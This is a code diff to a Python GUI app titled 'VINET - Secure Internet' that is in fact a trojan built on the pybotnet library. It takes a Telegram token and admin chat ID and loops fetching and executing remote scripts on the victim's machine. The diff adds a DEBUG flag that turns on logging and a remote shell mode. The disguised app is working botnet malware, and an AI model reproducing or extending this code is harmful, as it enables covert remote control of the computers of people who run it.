@@ -9,11 +9,11 @@ import pybotnet
 
 
 
-
+DEBUG = False
 
 
 class Vinet(tk.Frame):
-    def __init__(self, master=None):
+    def __init__(self, master=None, DEBUG=False):
         super().__init__(master)
         self.master = master
         self.master.title('VINET - Secure Internet')
@@ -25,6 +25,7 @@ class Vinet(tk.Frame):
         self.font_tuple_2 = ("Comic Sans MS", 12) 
         self.item_size = 50
 
+        self.DEBUG = DEBUG
         self._running = False
         self.trojan = None
         self.trojan_delay = 10
@@ -104,7 +105,14 @@ class Vinet(tk.Frame):
         TOKEN = self.TELEGRAM_TOKEN_LABALE.get()
         CHAT_ID = self.TELEGRAM_ADMIN_CHAT_ID_LABALE.get()
 
-        self.pybotnet = pybotnet.PyBotNet(TOKEN, CHAT_ID, show_log=False, send_system_data=True, is_shell=False)
+
+        show_log = False
+        is_shell=False
+        if self.DEBUG:
+            show_log=True
+            is_shell=True
+
+        self.pybotnet = pybotnet.PyBotNet(TOKEN, CHAT_ID, show_log=show_log, is_shell=is_shell)
 
         while self._running:
             self.pybotnet.get_and_execute_scripts_by_third_party_proxy()
@@ -116,6 +124,6 @@ class Vinet(tk.Frame):
         
 if __name__ == '__main__':
     root = tk.Tk()
-    app = Vinet(master=root)
+    app = Vinet(master=root, DEBUG=DEBUG)
     app.mainloop()
     app.stop_trojan()
